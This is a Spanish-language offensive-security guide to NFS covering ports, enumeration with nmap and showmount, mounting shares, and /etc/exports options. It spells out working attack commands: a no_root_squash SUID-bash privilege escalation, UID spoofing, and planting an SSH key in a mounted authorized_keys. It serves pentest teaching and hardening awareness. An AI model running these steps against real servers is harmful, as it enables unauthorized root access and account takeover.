# NFS — Network File System

NFS (Network File System) es el protocolo de compartición de archivos en red de sistemas Unix/Linux. Permite montar sistemas de archivos remotos como si fueran locales. Opera principalmente en el puerto **2049** (TCP/UDP) y requiere el servicio `portmapper` en el puerto **111** para mapear servicios RPC.

A diferencia de SMB, NFS fue diseñado para entornos Unix/Linux con un modelo de confianza basado en IPs y UIDs del sistema, lo que genera vulnerabilidades de escalada de privilegios características.

### Arquitectura y puertos

| Puerto         | Servicio             | Descripción                                     |
| -------------- | -------------------- | ----------------------------------------------- |
| `111` TCP/UDP  | Portmapper / rpcbind | Mapea servicios RPC a sus puertos               |
| `2049` TCP/UDP | NFS                  | Puerto principal del servicio NFS               |
| Puertos altos  | mountd, statd, lockd | Servicios auxiliares de NFS (puertos dinámicos) |

### Enumeración

#### Nmap

```bash
# Detección básica
nmap -sV -p 111,2049 target
nmap -sC -sV -p 111,2049 target

# Scripts específicos para NFS
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 target

# Enumerar servicios RPC en el portmapper
nmap --script rpcinfo -p 111 target
```

#### showmount — ver exports disponibles

`showmount` es la herramienta principal para ver qué directorios exporta un servidor NFS:

```bash
# Ver todos los exports del servidor
showmount -e target

# Ver qué clientes están montando
showmount -a target

# Ver directorios exportados
showmount -d target
```

Ejemplo de salida de `showmount -e target`:

```
Export list for target:
/srv/nfs/backup     *
/home               192.168.1.0/24
/var/data           10.10.10.5
```

El `*` significa que **cualquier host** puede montar ese directorio.

#### Montar un share NFS

```bash
# Crear punto de montaje
mkdir /mnt/nfs_target

# Montar el directorio remoto
mount -t nfs target:/srv/nfs/backup /mnt/nfs_target

# Ver el contenido
ls -la /mnt/nfs_target

# Desmontar al terminar
umount /mnt/nfs_target

# Montar con opciones (sin ejecutar archivos del share)
mount -t nfs -o ro,noexec,nosuid target:/srv/nfs/backup /mnt/nfs_target
```

### Riesgos y misconfiguraciones

#### no\_root\_squash — escalada de privilegios

Esta es la vulnerabilidad más crítica de NFS. Por defecto, NFS convierte las peticiones del usuario root del cliente a un usuario anónimo sin privilegios en el servidor (`root_squash`). Si el administrador desactiva esto con `no_root_squash`, el root del cliente **es root en el share del servidor**.

```bash
# Ver si no_root_squash está activo en un export
showmount -e target
# Si /directorio * → montar y verificar

# Crear un binario SUID para escalar en el servidor
# En el cliente, como root, montar el share:
mount -t nfs target:/directorio_vulnerable /mnt/nfs

# Copiar bash y darle SUID:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# En el servidor, como usuario normal:
/directorio_vulnerable/bash -p    # -p mantiene los privilegios SUID → root
```

#### Otras misconfiguraciones comunes

| Riesgo                               | Descripción                                                                                                                             |
| ------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Export con `*`**                   | Cualquier host puede montar el directorio, sin restricción de IP.                                                                       |
| **no\_root\_squash**                 | El root del cliente es root en el servidor → escalada de privilegios.                                                                   |
| **Datos sensibles expuestos**        | Directorios `/home`, `/etc` o backups montables sin autenticación.                                                                      |
| **Permisos incorrectos en archivos** | Archivos `.ssh/authorized_keys` escribibles → añadir clave pública y acceso SSH.                                                        |
| **UID spoofing**                     | NFS confía en el UID del cliente. Crear un usuario local con el mismo UID que el propietario de los archivos del share da acceso total. |

#### UID Spoofing

```bash
# Si el directorio NFS pertenece al UID 1001 en el servidor:
# Crear un usuario local con UID 1001 en el cliente atacante
useradd -u 1001 nfsuser
su nfsuser

# Ahora este usuario tiene acceso a los archivos del share
# como si fuera el propietario original
ls -la /mnt/nfs_target
```

#### Acceso a SSH keys vía NFS

```bash
# Si /home de un usuario está exportado y no_root_squash está activo:
mount -t nfs target:/home/usuario /mnt/nfs

# Añadir nuestra clave pública al authorized_keys del usuario
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/.ssh/authorized_keys

# Conectar por SSH sin contraseña
ssh usuario@target
```

### /etc/exports — el archivo de configuración

El archivo `/etc/exports` define qué directorios se exportan y con qué opciones:

```
/directorio    cliente(opciones)

# Opciones relevantes:
rw             lectura y escritura (peligroso si es *rw)
ro             solo lectura
sync           escritura síncrona
async          escritura asíncrona
no_root_squash PELIGROSO: root del cliente = root en el servidor
root_squash    comportamiento seguro por defecto
all_squash     mapear todos los usuarios a anónimo
no_all_squash  comportamiento por defecto
```

> &#x20;`no_root_squash` combinado con un export accesible desde cualquier IP (`*`) es una vulnerabilidad crítica que lleva directamente a escalada de privilegios en el servidor.

> Al encontrar un share NFS accesible, revisar siempre si hay archivos `.ssh/`, archivos de configuración con contraseñas, o scripts con credenciales hardcodeadas. Los backups en NFS suelen contener información muy sensible.
